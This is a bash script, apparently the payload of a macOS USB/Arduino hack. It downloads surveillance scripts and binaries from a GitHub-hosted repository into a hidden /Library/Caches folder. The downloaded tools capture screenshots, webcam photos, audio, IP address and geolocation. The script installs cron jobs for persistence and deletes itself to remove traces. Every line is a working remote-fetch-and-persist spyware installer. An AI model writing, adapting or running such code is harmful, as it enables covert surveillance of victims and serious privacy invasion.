#!/bin/bash

# Download the main files from the repository and saves them to the /Library/Caches folder (write accessible, concealed folder)
curl -O /Library/Caches/cron-05.sh https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/crons/cron-05.sh
curl -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/crons/cron-60.sh

curl -O /Library/Caches/soundalarm.scpt https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/resources/soundalarm.scpt
curl -O /Library/Caches/clickpoint.scpt https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/resources/clickpoint.scpt

curl -O /Library/Caches/getuuid.sh https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/resources/getuuid.sh
curl -O /Library/Caches/getip.sh https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/resources/getip.sh
curl -O /Library/Caches/recordaudio.sh https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/resources/recordaudio.sh
curl -O /Library/Caches/screenshot.sh https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/resources/screenshot.sh
curl -O /Library/Caches/photo.sh https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/resources/photo.sh
curl -O /Library/Caches/locateme.sh https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/resources/locateme.sh

curl -O /Library/Caches/LocateMe https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/resources/LocateMe
curl -O /Library/Caches/imagesnap https://raw.githubusercontent.com/entpnomad/osx-usb-hack-arduino/master/resources/imagesnap

chmod 755 /Library/Caches/LocateMe
chmod 755 /Library/Caches/imagesnap

# Add cron task to check for updates every hour
( crontab -l ; echo "0 * * * * cd /Library/Caches && sh cron-60.sh > /Library/Caches/cron-60.log 2>&1" ) | crontab -

# Add cron task to run every minute
( crontab -l ; echo "*/5 * * * * cd /Library/Caches && sh cron-05.sh > /Library/Caches/cron-05.log 2>&1" ) | crontab -

# Test the screenshot feature
# sh /Library/Caches/screenshot.sh 

# Test the IP feature
# sh /Library/Caches/getip.sh

# Test the photo feature (requires permissions)
# sh /Library/Caches/photo.sh 

# Test the audio recording feature (requires permissions)
# sh /Library/Caches/recordaudio.sh

# Test the geolocation feature (requires permissions)
# sh /Library/Caches/locateme.sh 

# Delete this file to remove traces
rm startup.sh
